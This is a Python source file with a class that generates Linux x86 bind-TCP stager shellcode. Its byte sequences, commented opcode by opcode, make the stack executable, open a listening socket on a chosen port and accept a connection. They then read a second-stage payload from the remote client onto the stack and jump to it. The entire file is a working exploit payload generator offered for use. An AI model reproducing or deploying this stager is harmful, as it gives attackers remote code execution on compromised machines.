import struct


class BindTcpX86:
    """Mixin that provides Linux x86 bind-TCP stager generation."""

    buf = bytearray()

    def _clear_state(self):
        """Clears the state of the variables needed for payload generation."""
        self.buf = bytearray()

    def _encode_port(self, port, af_inet=2):
        """Encode port + AF_INET into a 4-byte little-endian push immediate."""
        packed = struct.pack("<H", af_inet) + struct.pack(">H", port)
        val = struct.unpack("<I", packed)[0]
        return struct.pack("<I", val)

    def emit(self, *chunks):
        """Append instruction bytes to the shellcode buffer."""
        for chunk in chunks:
            self.buf.extend(chunk)

    def _exitfunc_stub(self, exitfunc):
        """Return the x86 exit stub for *exitfunc*."""
        ef = str(exitfunc).lower().strip()
        if ef in ("process", "thread"):
            return (
                b"\x6a\x01"  # push 1
                b"\x58"  # pop eax
                b"\x31\xdb"  # xor ebx, ebx
                b"\xcd\x80"  # int 0x80
            )
        return b""

    def generate_bind_tcp(self, port, af_inet=2, exitfunc="process"):
        """Assemble the Linux x86 bind-TCP stager using the specific bytecode sequence provided."""
        encoded_port = self._encode_port(port, af_inet)

        # Make sure the buf is blank slate before generation start.
        self._clear_state()
        self.emit(
            # mprotect block
            b"\x6a\x7d",  # push 0x7d
            b"\x58",  # pop eax
            b"\x99",  # cdq
            b"\xb2\x07",  # mov dl, 7
            b"\xb9\x00\x10\x00\x00",  # mov ecx, 0x1000
            b"\x89\xe3",  # mov ebx, esp
            b"\x66\x81\xe3\x00\xf0",  # and bx, 0xf000
            b"\xcd\x80",  # int 0x80
            # socket(AF_INET, SOCK_STREAM, 0)
            b"\x31\xdb",  # xor ebx, ebx
            b"\xf7\xe3",  # mul ebx
            b"\x53",  # push ebx
            b"\x43",  # inc ebx
            b"\x53",  # push ebx
            b"\x6a" + struct.pack("B", af_inet),  # push af_inet
            b"\x89\xe1",  # mov ecx, esp
            b"\xb0\x66",  # mov al, 0x66
            b"\xcd\x80",  # int 0x80
            b"\x97",  # xchg eax, edi (save socket fd)
            # setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, [1], 4)
            b"\x6a\x01",  # push 1
            b"\x89\xe2",  # mov edx, esp
            b"\x6a\x04",  # push 4
            b"\x52",  # push edx
            b"\x6a\x02",  # push 2 (SO_REUSEADDR)
            b"\x6a\x01",  # push 1 (SOL_SOCKET)
            b"\x57",  # push edi (socket fd)
            b"\x89\xe1",  # mov ecx, esp
            b"\x6a\x0e",  # push 0xe (SYS_SETSOCKOPT)
            b"\x5b",  # pop ebx
            b"\x6a\x66",  # push 0x66
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
            b"\x83\xc4\x14",  # add esp, 0x14 (clean stack)
            # bind(fd, [AF_INET, LPORT, INADDR_ANY], 16)
            b"\x31\xd2",  # xor edx, edx
            b"\x52",  # push edx (INADDR_ANY)
            b"\x68" + encoded_port,  # push [AF_INET|LPORT]
            b"\x89\xe1",  # mov ecx, esp
            b"\x6a\x10",  # push 0x10
            b"\x51",  # push ecx
            b"\x57",  # push edi
            b"\x89\xe1",  # mov ecx, esp
            b"\x6a\x02",  # push 2 (SYS_BIND)
            b"\x5b",  # pop ebx
            b"\x6a\x66",  # push 0x66
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
            # listen(fd, 2)
            b"\xd1\xe3",  # shl ebx, 1 (ebx = 4 = SYS_LISTEN)
            b"\xb0\x66",  # mov al, 0x66
            b"\xcd\x80",  # int 0x80
            # accept(fd, 0, 0)
            b"\x57",  # push edi
            b"\x43",  # inc ebx (ebx = 5 = SYS_ACCEPT)
            b"\xb0\x66",  # mov al, 0x66
            b"\x31\xd2",  # xor edx, edx
            b"\x52",  # push edx
            b"\x52",  # push edx
            b"\x57",  # push edi
            b"\x89\xe1",  # mov ecx, esp
            b"\xcd\x80",  # int 0x80
            # read(client_fd, esp, 0x0c00)
            b"\x93",  # xchg eax, ebx (ebx = client_fd)
            b"\x89\xe1",  # mov ecx, esp
            b"\xba\x00\x0c\x00\x00",  # mov edx, 0x0c00
            b"\xb0\x03",  # mov al, 3 (sys_read)
            b"\xcd\x80",  # int 0x80
            # close(listen_fd) and jump
            b"\x87\xfb",  # xchg edi, ebx (ebx = listen_fd)
            b"\x5b",  # pop ebx
            b"\x6a\x06",  # push 6 (sys_close)
            b"\x58",  # pop eax
            b"\xcd\x80",  # int 0x80
            b"\xff\xe1",  # jmp ecx (jump to stage)
        )

        # Append optional exit stub
        self.emit(self._exitfunc_stub(exitfunc))
        return bytes(self.buf)
